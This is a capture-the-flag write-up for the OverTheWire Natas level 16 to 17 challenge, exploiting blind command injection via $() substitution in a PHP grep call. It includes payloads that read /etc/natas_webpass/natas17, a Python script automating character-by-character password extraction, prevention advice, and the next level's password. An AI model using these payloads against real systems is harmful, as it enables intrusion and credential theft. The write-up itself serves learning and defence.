# Natas Level 16 → 17

## Objective

Retrieve the password for the next level by exploiting a Blind Command Injection vulnerability.

The application executes system commands using user input but filters some special characters.

The goal is to bypass the filter and extract the password stored on the server.

---

## Enumeration

- Reviewed the webpage functionality.
- Found a word search feature.
- The application searches for words inside a dictionary file.
- Reviewed the source code.
- Observed that user input is passed into a Linux command.
- Identified a possible command injection vulnerability.

---

# Source Code Analysis

The application takes user input:

```php
$key = $_REQUEST["needle"];
```

The input is filtered:

```php
if(preg_match('/[;|&`\'"]/',$key)) {
    print "Input contains an illegal character!";
}
```

The blocked characters are:

```text
;
|
&
`
'
"
```

---

## Vulnerable Code

The filtered input is inserted into a shell command:

```php
passthru("grep -i \"$key\" dictionary.txt");
```

The executed command becomes:

```bash
grep -i "USER_INPUT" dictionary.txt
```

Since user-controlled data reaches the shell, command injection is possible.

---

# Vulnerability

## Blind Command Injection

Common command separators are blocked:

Example:

```bash
test; whoami
```

Blocked.

```bash
test && whoami
```

Blocked.

However, the filter does not block command substitution:

```bash
$()
```

Linux executes commands inside `$()` first.

Example:

```bash
echo $(whoami)
```

Execution:

```text
1. whoami runs
2. Output replaces $()
3. echo displays result
```

---

# Command Injection Test

Payload:

```bash
$(whoami)
```

The server command becomes:

```bash
grep -i "$(whoami)" dictionary.txt
```

The shell executes:

```bash
whoami
```

which returns:

```text
natas16
```

The final command becomes:

```bash
grep -i "natas16" dictionary.txt
```

The output of `whoami` is not displayed directly because it becomes the search term for grep.

Therefore, this is a blind command injection.

---

# Why Direct Password Reading Fails

Password location:

```text
/etc/natas_webpass/natas17
```

Trying:

```bash
$(cat /etc/natas_webpass/natas17)
```

The command becomes:

```bash
grep -i "$(cat /etc/natas_webpass/natas17)" dictionary.txt
```

First:

```bash
cat /etc/natas_webpass/natas17
```

returns the password.

Then:

```bash
grep -i "PASSWORD" dictionary.txt
```

is executed.

The password is searched inside the dictionary instead of being printed.

No output is displayed.

---

# Exploitation Strategy

Since output cannot be viewed directly, extract the password using TRUE/FALSE questions.

Use:

```bash
grep
```

to check password characters.

Example:

```bash
grep ^a /etc/natas_webpass/natas17
```

Meaning:

```text
Does password start with 'a'?
```

---

## Response Difference Trick

Payload:

```bash
hello$(grep ^a /etc/natas_webpass/natas17)
```

---

## Case 1 - Wrong Character

Actual password:

```text
Bxxxx
```

Command:

```bash
grep ^a passwordfile
```

returns nothing.

Payload becomes:

```text
hello
```

Final command:

```bash
grep hello dictionary.txt
```

Output appears.

Result:

```text
Wrong character
```

---

## Case 2 - Correct Character

Actual password:

```text
axxxx
```

Command:

```bash
grep ^a passwordfile
```

returns:

```text
axxxx
```

Payload becomes:

```text
helloaxxxx
```

Final command:

```bash
grep helloaxxxx dictionary.txt
```

No match exists.

Output disappears.

Result:

```text
Correct character found
```

---

# Automation

Instead of testing manually, Python can automate the extraction.

## Logic

```python
known_password = ""

for each position:

    for each character:

        test known_password + character

        if output disappears:
            save character
```

---

# Exploit Script

```python
import requests
from requests.auth import HTTPBasicAuth


url = "http://natas16.natas.labs.overthewire.org/index.php"


session = requests.Session()

session.auth = HTTPBasicAuth(
    "natas16",
    "<password>"
)


chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"

password = ""


while len(password) < 32:

    for ch in chars:


        guess = password + ch


        payload = (
            f"hello$(grep ^{guess} "
            f"/etc/natas_webpass/natas17)"
        )


        response = session.get(
            url,
            params={"needle":payload}
        )


        if "hello" not in response.text:

            password += ch

            print(password)

            break


print("Password:",password)
```

---

# Attack Flow

```
Open Search Page
        |
        v
Review Source Code
        |
        v
Find Shell Execution
        |
        v
Identify Filter Rules
        |
        v
Bypass Using $()
        |
        v
Confirm Command Injection
        |
        v
Create TRUE/FALSE Condition
        |
        v
Extract Password Characters
        |
        v
Automate Extraction
        |
        v
Retrieve Next Password
```

---

# Result

The password was successfully extracted using Blind Command Injection.

The application never directly displayed command output, but differences in application responses leaked the secret.

---

# Prevention

- Never pass user input directly into system commands.
- Avoid functions like:

```php
system()
exec()
passthru()
shell_exec()
```

with user-controlled data.

- Use safer language APIs instead of shell commands.
- Apply strict allow-list input validation.
- Escape shell arguments properly.

Example:

```php
escapeshellarg($input)
```

---

# Key Takeaways

- Command Injection can exist even with filters.
- Blocking a few characters is not a complete defense.
- `$()` can perform command substitution.
- Blind vulnerabilities leak data through behavior differences.
- Automation makes blind attacks practical.
- Avoid executing shell commands with user input.

---

<details>
<summary><strong>🔑 Password (Spoiler)</strong></summary>

```text
Username : natas17
Password : KLdAM3VZux8o6TbkbhuaG5KtYjI77tfx
```

</details>